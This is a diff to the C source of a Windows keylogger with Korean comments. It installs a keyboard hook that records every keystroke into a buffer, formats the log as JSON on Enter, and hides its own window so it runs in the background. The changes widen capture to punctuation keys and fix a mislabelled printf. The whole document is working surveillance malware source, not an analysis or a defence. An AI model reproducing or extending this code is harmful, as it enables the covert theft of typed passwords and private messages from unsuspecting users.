@@ -147,7 +147,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             {
                 printf("Enter \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Enter ");
-                logBuffer[logBufferIndex] = '\0'; 
+                logBuffer[logBufferIndex] = '\0';
 
                 // JSON 데이터 생성
                 char json_data[BUFSIZE];
@@ -194,6 +194,11 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 printf("Windows \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "Windows ");
             }
+            else if (VK_OEM_1 == pKey->vkCode)
+            {
+                printf("; \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "; ");
+            }
             else if (VK_OEM_2 == pKey->vkCode)
             {
                 printf("/ \n");
@@ -201,8 +206,43 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             }
             else if (VK_OEM_3 == pKey->vkCode)
             {
-                printf("/ \n");
+                printf("` \n");
                 logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "` ");
+            }
+            else if (VK_OEM_4 == pKey->vkCode)
+            {
+                printf("[ \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "[ ");
+            }
+            else if (VK_OEM_6 == pKey->vkCode)
+            {
+                printf("] \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "] ");
+            }
+            else if (VK_OEM_7 == pKey->vkCode)
+            {
+                printf("' \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "' ");
+            }
+            else if (VK_OEM_COMMA == pKey->vkCode)
+            {
+                printf(", \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, ", ");
+            }
+            else if (VK_OEM_PERIOD == pKey->vkCode)
+            {
+                printf(". \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, ". ");
+            }
+            else if (VK_OEM_PLUS == pKey->vkCode)
+            {
+                printf("= \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "= ");
+            }
+            else if (VK_OEM_MINUS == pKey->vkCode)
+            {
+                printf("- \n");
+                logBufferIndex += snprintf(logBuffer + logBufferIndex, BUFSIZE - logBufferIndex, "- ");
             }
             else   //그외 문자들(숫자, 알파벳)
             {
@@ -242,7 +282,7 @@ void CALLBACK TimerProc(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime)
 
 int main(int argc, char* argv[])
 {
-    
+
     HWND hWnd = GetForegroundWindow();
     ShowWindow(hWnd, SW_HIDE); // 백그라운드 실행
 
